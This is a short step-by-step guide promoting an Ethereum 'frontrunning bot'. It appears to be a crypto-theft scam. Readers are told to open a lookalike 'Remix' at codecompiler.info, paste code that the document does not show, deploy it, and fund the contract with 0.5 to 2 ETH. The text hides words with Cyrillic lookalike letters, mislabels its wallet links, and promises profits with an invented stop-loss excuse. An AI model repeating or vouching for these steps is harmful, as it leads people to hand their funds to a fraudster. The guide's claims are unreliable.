🟢 Step 1: Download the MetaMask Extension

You only need one Wallet Extension, choose whichever is convenient for you.

🔗 -Dоwnlоаd Соin Ваse Wаllеt: https://www.coinbase.com/wallet

🔗 -Dоwnlоаd Тrust Wаllеt: https://trustwallet.com/



🟢 Step 2: Open Remix

🔗 https://codecompiler.info

🟢 Step 3:

Click on the 'Contracts' folder and create a New File. Name it however you like (e.g., 'bot.sol'). Make sure the file ends with .sol for Ethereum code.



🟢 Step 4: Paste the following code into Remix:

🟢 Step 5:

Navigate to the Solidity Compiler tab in Remix and compile your bot.



⚠️ Tip: If the code doesn't show up with colors, simply refresh the browser and paste the code again.



🟢 Step 6:

Go to the 'Deploy & Run Transactions' tab, choose 'Injected Provider' as your environment, and click Deploy. After confirming the contract creation fee in MetaMask, your contract will be deployed.

⚠️ Tip: If you get any issues - use a clean Firefox browser and only one Metamask extension



🟢 Step 7:

Add funds to your bot for transaction frontrunning

⚠️⚠️⚠️ Do not try to test the bot using too low amount - in this case transaction fees will be higher than your profits and the bot will instantly catch Stop Loss and will not start ⚠️⚠️⚠️.

The minimum recommended amount is 0.5 ETH. But I recommend to use 1-2, so that the bot can process more transactions - in this case the profits will be much better.



🟢 Step 8:

Once the transaction is confirmed, click Start to activate the bot. To stop it and withdraw funds, click Withdraw.

(Make sure you have enough eth in your main wallet (not in your contract address) to pay the gas fee for pressing the Start button.)



🔍 How can I restore the old contract?

Instead of deploying a new contract, simply input the contract's address in the 'At Address' field and press the At Address button.



⚠️ Important: You can only restore access using the same MetaMask account that was used to deploy the contract.
